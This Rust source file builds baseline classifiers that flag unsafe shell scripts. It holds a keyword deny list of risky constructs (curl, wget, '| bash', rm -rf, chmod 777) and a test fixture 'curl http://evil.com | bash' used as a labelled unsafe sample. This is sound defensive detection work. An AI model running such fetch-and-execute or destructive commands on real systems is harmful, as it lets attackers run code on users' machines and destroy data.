//! Baseline classifiers for comparison (SSC v11 Section 5.5).
//!
//! Three baselines that any ML classifier must beat:
//! 1. **Majority class**: Always predict "safe" (MCC = 0.0)
//! 2. **Keyword regex**: Pattern match on known-unsafe keywords (MCC ~0.3-0.5)
//! 3. **bashrs linter**: Use 14 linter rules as classifier (MCC ~0.4-0.6)

use crate::corpus::evaluation::{evaluate, EvaluationReport};
use crate::linter::lint_shell;
use std::sync::LazyLock;

/// Keyword patterns for the regex baseline classifier.
/// These are known-unsafe constructs that a simple grep would catch.
static UNSAFE_KEYWORDS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
    vec![
        "eval ",
        "eval\t",
        "$RANDOM",
        "curl ",
        "wget ",
        "| bash",
        "| sh",
        "rm -rf",
        "chmod 777",
        "chmod +s",
        "sudo ",
        "/dev/urandom",
        "/dev/random",
        "$(date",
        "exec ",
        "source <(",
        "bash -c",
        ". /dev/stdin",
    ]
});

/// Majority baseline: always predict "safe" (label=0).
pub fn majority_baseline(entries: &[(&str, u8)]) -> EvaluationReport {
    let predictions: Vec<(u8, u8)> = entries.iter().map(|&(_, truth)| (0, truth)).collect();
    evaluate(&predictions, "majority (all-safe)")
}

/// Keyword regex baseline: predict "unsafe" if script matches any keyword.
pub fn keyword_baseline(entries: &[(&str, u8)]) -> EvaluationReport {
    let predictions: Vec<(u8, u8)> = entries
        .iter()
        .map(|&(script, truth)| {
            let pred = u8::from(UNSAFE_KEYWORDS.iter().any(|kw| script.contains(kw)));
            (pred, truth)
        })
        .collect();
    evaluate(&predictions, "keyword regex")
}

/// Linter baseline: predict "unsafe" if linter produces any security or
/// determinism finding.
pub fn linter_baseline(entries: &[(&str, u8)]) -> EvaluationReport {
    let predictions: Vec<(u8, u8)> = entries
        .iter()
        .map(|&(script, truth)| {
            let result = lint_shell(script);
            let has_security = result.diagnostics.iter().any(|d| d.code.starts_with("SEC"));
            let has_det = result.diagnostics.iter().any(|d| d.code.starts_with("DET"));
            let pred = u8::from(has_security || has_det);
            (pred, truth)
        })
        .collect();
    evaluate(&predictions, "bashrs linter (24 SEC + DET/IDEM rules)")
}

/// Run all three baselines on the same dataset and return reports.
pub fn run_all_baselines(entries: &[(&str, u8)]) -> Vec<EvaluationReport> {
    vec![
        majority_baseline(entries),
        keyword_baseline(entries),
        linter_baseline(entries),
    ]
}

/// Build baseline entries from the corpus: returns (script, binary_label) pairs.
///
/// Transpiles each entry to shell and uses the **shell output** as the
/// classification text (not the Rust input). This ensures the training
/// distribution matches inference, where users provide shell scripts.
///
/// Label derivation: lint the transpiled shell output for SEC/DET findings.
/// Entries that fail transpilation are labeled unsafe (label=1).
pub fn corpus_baseline_entries() -> Vec<(String, u8)> {
    use crate::corpus::registry::CorpusRegistry;
    let registry = CorpusRegistry::load_full();
    corpus_baseline_entries_from(&registry)
}

/// Like [`corpus_baseline_entries`] but accepts a pre-loaded registry to avoid
/// redundant corpus construction (17k+ entries).
pub fn corpus_baseline_entries_from(
    registry: &crate::corpus::registry::CorpusRegistry,
) -> Vec<(String, u8)> {
    use crate::corpus::dataset::{classify_single, strip_shell_preamble};
    use crate::corpus::registry::CorpusFormat;

    let config = crate::Config::default();
    registry
        .entries
        .iter()
        .map(|e| {
            let transpile_fn = match e.format {
                CorpusFormat::Bash => crate::transpile,
                CorpusFormat::Makefile => crate::transpile_makefile,
                CorpusFormat::Dockerfile => crate::transpile_dockerfile,
            };
            match transpile_fn(&e.input, &config) {
                Ok(shell) => {
                    let stripped = strip_shell_preamble(&shell);
                    let result = lint_shell(&stripped);
                    let has_security = result.diagnostics.iter().any(|d| d.code.starts_with("SEC"));
                    let has_det = result.diagnostics.iter().any(|d| d.code.starts_with("DET"));
                    let row = classify_single(&stripped, true, !has_security, !has_det);
                    (stripped, row.label)
                }
                Err(_) => {
                    let row = classify_single(&e.input, false, true, true);
                    (e.input.clone(), row.label)
                }
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_majority_baseline_mcc_zero() {
        let entries: Vec<(&str, u8)> = vec![("echo hello", 0), ("eval $x", 1), ("ls -la", 0)];
        let report = majority_baseline(&entries);
        assert!((report.mcc - 0.0).abs() < 1e-9, "Majority MCC must be 0");
        assert_eq!(report.name, "majority (all-safe)");
    }

    #[test]
    fn test_keyword_baseline_catches_eval() {
        let entries: Vec<(&str, u8)> = vec![("echo hello", 0), ("eval $x", 1)];
        let report = keyword_baseline(&entries);
        assert!(report.recall > 0.0, "Should catch eval");
    }

    #[test]
    fn test_keyword_baseline_catches_curl_pipe() {
        let entries: Vec<(&str, u8)> = vec![("echo safe", 0), ("curl http://evil.com | bash", 1)];
        let report = keyword_baseline(&entries);
        assert_eq!(report.confusion.tp, 1);
    }

    #[test]
    fn test_linter_baseline_finds_security() {
        let entries: Vec<(&str, u8)> = vec![("echo hello", 0), ("eval $x", 1), ("echo $RANDOM", 1)];
        let report = linter_baseline(&entries);
        assert!(report.recall > 0.0, "Linter should catch unsafe patterns");
    }

    #[test]
    fn test_run_all_baselines() {
        let entries: Vec<(&str, u8)> = vec![("echo hello", 0), ("eval $x", 1)];
        let reports = run_all_baselines(&entries);
        assert_eq!(reports.len(), 3);
        assert_eq!(reports[0].name, "majority (all-safe)");
        assert_eq!(reports[1].name, "keyword regex");
        assert_eq!(reports[2].name, "bashrs linter (24 SEC + DET/IDEM rules)");
    }

    #[test]
    fn test_keyword_list_has_entries() {
        assert!(
            UNSAFE_KEYWORDS.len() >= 10,
            "Need at least 10 keyword patterns"
        );
    }

    #[test]
    fn test_keyword_no_false_negative_on_random() {
        let entries: Vec<(&str, u8)> = vec![("echo $RANDOM", 1)];
        let report = keyword_baseline(&entries);
        assert_eq!(report.confusion.tp, 1, "Should catch $RANDOM");
    }

    #[test]
    fn test_corpus_baseline_entries_from_matches_standalone() {
        // Verify _from variant produces identical results to standalone.
        // Use a small registry subset to keep the test fast.
        use crate::corpus::registry::CorpusRegistry;
        let registry = CorpusRegistry::load_full();
        let from_result = corpus_baseline_entries_from(&registry);
        // Sanity: same count as full corpus
        assert_eq!(from_result.len(), registry.entries.len());
        // Each entry should have a valid label (0 or 1)
        for (_, label) in &from_result {
            assert!(*label <= 1, "Label must be 0 or 1");
        }
    }
}
